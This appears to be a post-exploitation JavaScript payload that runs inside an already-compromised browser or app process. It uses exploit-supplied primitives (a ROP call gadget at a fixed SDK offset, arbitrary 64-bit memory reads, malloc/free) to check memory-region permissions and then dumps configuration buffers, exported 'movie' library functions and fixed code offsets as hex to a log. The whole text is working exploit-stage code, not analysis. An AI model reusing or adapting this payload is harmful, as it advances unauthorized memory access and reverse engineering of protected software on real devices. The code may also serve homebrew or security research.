(async function(){
 var P=window.__moonlightConfigProbe,N=P.N,info=malloc(64),page=malloc(8);
 function range(p,n){if(call_rop(sdk_base+0x168b0cn,info,page,p)&0x3fffffn)throw Error('Query failed');if(!(read32(info+24n)&1n)||p<read64(info)||p+BigInt(n+4)>read64(info)+read64(info+8n))throw Error('Range rejected');}
 function hex(b){return Array.from(b,function(x){return ('0'+x.toString(16)).slice(-2);}).join('');}
 async function data(label,p,n){range(p,n);await log('MOONLIGHT_CONFIG_BUFFER: '+JSON.stringify({label:label,address:p.toString(16),hex:hex(N.copyFrom(p,n))}));}
 var root=read64(P.config);range(root,0x608);var value=read64(root+0x180n);await data('avcc-value',value,24);var buffer=read64(value+8n);await data('avcc-buffer',buffer,64);
 for(var name of ['_ZN5movie6BufferaSERKS0_','_ZN5movie9MediaDataaSERKS0_','_ZN5movie6BufferD1Ev']){
  var e=N.movieExports[name];if(!e)continue;range(e.address,e.size);await log('MOONLIGHT_RENDER_SLICE: '+JSON.stringify({offset:e.offset,permissions:5,hex:hex(N.copyFrom(e.address,e.size))}));
 }
 for(var entry of [[0x2b534f0,640],[0x2b50c80,368]]){var p=N.movieBase+BigInt(entry[0]);range(p,entry[1]);await log('MOONLIGHT_RENDER_SLICE: '+JSON.stringify({offset:entry[0].toString(16),permissions:5,hex:hex(N.copyFrom(p,entry[1]))}));}
 free(page);free(info);
})();
